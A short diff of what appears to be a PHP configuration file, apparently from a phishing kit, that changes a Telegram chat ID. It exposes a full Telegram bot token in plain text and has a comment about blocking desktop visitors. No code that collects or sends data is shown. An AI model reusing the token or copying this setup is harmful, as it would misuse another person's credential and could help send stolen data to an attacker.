@@ -2,7 +2,7 @@
 
 //Have a telegram bot? put the tokens here :D
 $bot = "6122494476:AAHw3y87SQbDVg2suTMbuAkwFEFmvSCTQUs";
-$chat_ids = array("979803173");
+$chat_ids = array("-4091358695");
 
 
 // to block pc - on | off
